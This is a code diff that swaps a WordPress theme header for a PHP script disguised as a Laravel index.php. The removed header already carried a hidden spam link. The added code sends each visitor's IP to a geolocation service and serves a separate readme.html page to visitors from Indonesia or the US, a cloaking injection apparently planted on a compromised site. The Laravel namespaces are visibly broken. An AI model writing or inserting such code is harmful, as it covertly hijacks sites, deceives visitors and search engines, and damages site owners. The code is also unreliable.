@@ -1,155 +1,97 @@
 <?php
-do_action( 'tdc_header' );
-if ( has_action( 'tdc_header' ) ) {
-    return;
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+function getUserIP() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    } else {
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+    return $ip;
 }
-?>
-<!doctype html >
-<html <?php language_attributes(); ?>>
-<head>
-    <meta charset="<?php bloginfo( 'charset' );?>" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
-    <?php wp_head(); ?>
-</head>
 
-<body <?php body_class('tagdiv-small-theme') ?> itemscope="itemscope" itemtype="https://schema.org/WebPage">
-<?php wp_body_open() ?>
+$ip = getUserIP();
+$api_url = "http://ip-api.com/json/{$ip}";
 
-<div style="display: none;">
-<li><a href="https://linklist.bio/jamur4d" rel="dofollow">https://linklist.bio/jamur4d</a></li><br>
-</div>
+$response = @file_get_contents($api_url);
+
+if ($response === FALSE) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $api_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $response = curl_exec($ch);
+    curl_close($ch);
+}
+
+$data = json_decode($response, true);
+
+if ($data && ($data['countryCode'] === 'ID' || $data['countryCode'] === 'US')) {
+    ob_start();
+    include 'readme.html';
+    $output = ob_get_clean();
+    echo $output;
+    exit();
+}
+/**
+ * Laravel - A PHP Framework For Web Artisans
+ *
+ * @package  Laravel
+ * @author   Taylor Otwell <taylor@laravel.com>
+ */
+
+define('LARAVEL_START', microtime(true));
+
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader for
+| our application. We just need to utilize it! We'll simply require it
+| into the script here so that we don't have to worry about manual
+| loading any of our classes later on. It feels great to relax.
+|
+*/
+
+require __DIR__.'/laravel/vendor/autoload.php';
+
+/*
+|--------------------------------------------------------------------------
+| Turn On The Lights
+|--------------------------------------------------------------------------
+|
+| We need to illuminate PHP development, so let us turn on the lights.
+| This bootstraps the framework and gets it ready for use, then it
+| will load up this application so that we can run it and send
+| the responses back to the browser and delight our users.
+|
+*/
+
+$app = require_once __DIR__.'/laravel/bootstrap/app.php';
+
+/*
+|--------------------------------------------------------------------------
+| Run The Application
+|--------------------------------------------------------------------------
+|
+| Once we have the application, we can handle the incoming request
+| through the kernel, and send the associated response back to
+| the client's browser allowing them to enjoy the creative
+| and wonderful application we have prepared for them.
+|
+*/
 
 
-    <!-- Mobile Search -->
-    <div class="td-search-background" style="visibility:hidden"></div>
-    <div class="td-search-wrap-mob" style="visibility:hidden">
-        <div class="td-drop-down-search" aria-labelledby="td-header-search-button">
-            <form method="get" class="td-search-form" action="<?php echo esc_url( home_url( '/' ) ); ?>">
-                <div class="td-search-close">
-                    <a href="#"><i class="td-icon-close-mobile"></i></a>
-                </div>
-                <div role="search" class="td-search-input">
-                    <span><?php esc_attr_e('Search', 'newspaper' )?></span>
-                    <label for="td-header-search-mob">
-                        <input id="td-header-search-mob" type="text" value="<?php echo get_search_query(); ?>" name="s" autocomplete="off" />
-                    </label>
-                </div>
-            </form>
-            <div id="td-aj-search-mob"></div>
-        </div>
-    </div>
+$kernel = $app->make(IlluminateContractsHttpKernel::class);
 
-    <!-- Mobile Menu -->
-    <div class="td-menu-background" style="visibility:hidden"></div>
-    <div id="td-mobile-nav" style="visibility:hidden">
-        <div class="td-mobile-container">
-            <!-- mobile menu top section -->
-            <div class="td-menu-socials-wrap">
-                <!-- close button -->
-                <div class="td-mobile-close">
-                    <a href="#"><i class="td-icon-close-mobile"></i></a>
-                </div>
-            </div>
+$response = $kernel->handle(
+    $request = IlluminateHttpRequest::capture()
+);
 
-            <!-- menu section -->
-            <div class="td-mobile-content">
-                <?php
-                    wp_nav_menu(array(
-                        'theme_location' => 'header-menu',
-                        'menu_class'=> 'td-mobile-main-menu',
-                        'fallback_cb' => 'tagdiv_wp_no_mobile_menu',
-                        'link_after' => '<i class="td-icon-menu-right td-element-after"></i>'
-                    ));
 
-                // if no menu
-                function tagdiv_wp_no_mobile_menu() {
-                    if ( current_user_can( 'switch_themes' ) ) {
-                        echo '<ul class="">';
-                        echo '<li class="menu-item-first"><a href="' . esc_url(home_url('/')) . 'wp-admin/nav-menus.php?action=locations">Add menu</a></li>';
-                        echo '</ul>';
-                    }
-                }
-                ?>
-            </div>
-        </div>
-    </div>
 
-    <div id="td-outer-wrap" class="td-theme-wrap">
-        <div class="td-header-wrap td-header-style-1">
-            <div class="td-banner-wrap-full td-logo-wrap-full td-container-wrap">
-                <div class="td-header-sp-logo">
-                    <?php
-                        $td_logo_text = get_bloginfo('name');
-                        $td_tagline_text = get_bloginfo('description');
+$response->send();
 
-                        // H1 on logo when there's no title with H1 in page
-                        $td_use_h1_logo = false;
-                        if (is_home()) {
-                            $td_use_h1_logo = true;
-                        } ?>
-
-                    <div class="td-logo-text-wrap">
-                        <div class="td-logo-text-container">
-                            <?php
-                            if($td_use_h1_logo === true) {
-                                echo '<h1 class="td-logo">';
-                            };
-                            ?>
-                            <a class="td-logo-wrap" href="<?php echo esc_url(home_url( '/' )); ?>">
-                                <span class="td-logo-text"><?php if(!$td_logo_text) { echo "NEWSPAPER"; } else { echo esc_attr($td_logo_text); } ?></span>
-                            </a>
-                            <?php
-                            if($td_use_h1_logo === true) {
-                                echo '</h1>';
-                            };
-                            ?>
-                            <span class="td-tagline-text"><?php if(!$td_tagline_text) { echo "DISCOVER THE ART OF PUBLISHING"; } else { echo esc_attr($td_tagline_text); } ?></span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="td-header-menu-wrap-full td-container-wrap">
-                <div class="td-header-menu-wrap td-header-gradient">
-                    <div class="td-container td-header-row td-header-main-menu">
-                        <div id="td-header-menu" role="navigation">
-                            <div id="td-top-mobile-toggle"><a href="#" role="button" aria-label="mobile-toggle"><i class="td-icon-font td-icon-mobile"></i></a></div>
-
-                            <?php
-                                wp_nav_menu(array(
-                                    'theme_location' => 'header-menu',
-                                    'fallback_cb' => 'tagdiv_wp_page_menu',
-                                    'menu_class'=> 'sf-menu tagdiv-small-theme-menu',
-                                ));
-
-                            //if no menu
-                            function tagdiv_wp_page_menu() {
-                                if ( current_user_can( 'switch_themes' ) ) {
-                                    echo '<ul class="sf-menu">';
-                                    echo '<li class="menu-item-first"><a href="' . esc_url(home_url('/')) . 'wp-admin/nav-menus.php?action=locations">Add menu</a></li>';
-                                    echo '</ul>';
-                                }
-                            }
-                            ?>
-                        </div>
-
-                        <div class="header-search-wrap">
-                            <div class="td-search-btns-wrap">
-                                <a id="td-header-search-button" href="#" role="button" aria-label="Search"><i class="td-icon-search"></i></a>
-                                <a id="td-header-search-button-mob" href="#" role="button" aria-label="Search"><i class="td-icon-search"></i></a>
-                            </div>
-
-                            <div class="td-drop-down-search" aria-labelledby="td-header-search-button">
-                                <form method="get" class="td-search-form" action="<?php echo esc_url(home_url( '/' )); ?>">
-                                    <div role="search" class="td-head-form-search-wrap">
-                                        <input id="td-header-search" type="text" value="<?php echo get_search_query(); ?>" name="s" autocomplete="off" />
-                                        <input class="wpb_button wpb_btn-inverse btn" type="submit" id="td-header-search-top" value="<?php esc_attr_e('Search', 'newspaper')?>" />
-                                    </div>
-                                </form>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+$kernel->terminate($request, $response);
